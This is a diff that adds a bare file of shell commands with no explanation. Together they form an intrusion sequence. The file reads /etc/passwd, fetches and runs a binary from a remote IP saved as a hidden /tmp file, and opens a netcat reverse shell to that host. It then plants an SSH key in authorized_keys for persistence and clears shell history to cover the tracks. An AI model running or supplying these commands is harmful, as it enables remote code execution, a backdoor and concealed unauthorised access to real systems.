@@ -1,0 +1,10 @@
+uname -a
+whoami
+cat /etc/passwd
+wget http://185.220.101.7/x86_64 -O /tmp/.s
+chmod +x /tmp/.s
+/tmp/.s
+nc 185.220.101.7 4444 -e /bin/sh
+crontab -l
+echo 'ssh-rsa AAAAB3Nz...' >> ~/.ssh/authorized_keys
+history -c
